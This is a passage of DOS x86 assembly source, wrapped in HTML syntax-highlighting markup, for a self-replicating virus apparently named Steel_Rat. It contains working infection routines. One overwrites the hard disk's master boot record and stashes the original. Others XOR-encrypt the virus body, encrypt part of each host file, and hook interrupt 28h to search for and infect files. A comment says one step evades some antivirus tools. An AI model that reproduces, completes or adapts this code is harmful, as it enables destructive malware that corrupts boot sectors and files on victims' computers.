    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">            </span><span class="sc1">; Write old MBR to sector after our</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Slen</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; body</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoInfectMbr</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DPatch</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Choose crypt key</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">OurMbr</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">Free</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">OurMbrL</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">MaxGarb</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc5">MaxG</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Crypt loader</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">MinGarb</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc5">MinG</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AntiH1</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; No anti-heuristics</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">UseInt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; No int 21 usage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Smm</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Check if we fit in MBR sector ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NoInfectMbr</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">            </span><span class="sc1">; Write It</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">Free</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoInfectMbr</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">Steel_Rat</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Crypt virus</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">Free</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
</span><span class="sc5">CryptUs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DPatch</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CryptUs</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0300h</span><span class="sc4">+</span><span class="sc5">Slen</span><span class="sc0">       </span><span class="sc1">; Write to third sector</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">Free</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

</span><span class="sc5">NoInfectMbr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_mbr</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">OurMbr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; MBR Loader</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">            </span><span class="sc1">; Setup Stack</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; This nukes some AV'rs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc5">KbMem</span><span class="sc0"> </span><span class="sc1">; Decrease mem</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">             </span><span class="sc1">; Get amount of mem</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; Calculate segment</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Lets read to offset 100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">; virus body</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">SLen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">            </span><span class="sc1">; Read it</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B0h</span><span class="sc0">
</span><span class="sc5">DPatch</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">55h</span><span class="sc0">
</span><span class="sc5">DCrypt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Decrypt it</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DCrypt</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MBRInst</span><span class="sc0">     </span><span class="sc1">; To main virus installer</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">OurMbrl</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OurMbr</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">InfLen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Infect_Com</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">CHost</span><span class="sc0">
</span><span class="sc5">HostKey</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CryptHost</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; Crypt part of host</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Point to host entry</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">      </span><span class="sc1">; Load 1024 bytes from host</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">         </span><span class="sc1">; entry point</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">         </span><span class="sc1">; Get encryption key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HostKey</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">CryptH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Crypth</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">            </span><span class="sc1">; Point it back</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write crypted data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CryptHost</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">DecryptHost</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">HostKey</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DCHost</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DCHost</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DecryptHost</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">i28U</span><span class="sc0">
</span><span class="sc5">i28</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Allow</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">LetsInfectIt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoInfect</span><span class="sc0">
</span><span class="sc5">LetsInfectIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IntInf</span><span class="sc4">],</span><span class="sc5">i28c</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoInfect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IntInf</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SSt</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SPt</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">AxS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Sta</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">              </span><span class="sc1">; Store old DTA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DtaS</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DtaS</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dta</span><span class="sc0">           </span><span class="sc1">; Setup Dta</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msk</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">FFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">InfectedIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Infected</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fname</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Infected</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfectedIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FFile</span><span class="sc0">
</span><span class="sc5">InfectedIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DtaS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SSt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SPt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">AxS</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NoInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Old28</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">SSt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SPt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Axs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Dtas</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Msk</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

</span><span class="sc5">IntInf</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Infected</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Key</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Mark</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; Get file date</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; Store it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FLen</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">iCheck2</span><span class="sc0">              </span><span class="sc1">; If it divides by infection</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; mark ?</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoPatchSize</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Flen</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; Nope... Lets fill up</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                 </span><span class="sc1">; Store size</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">; To the end of file</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">          </span><span class="sc1">; Fill with garbage</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">LL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LL</span><span class="sc0">

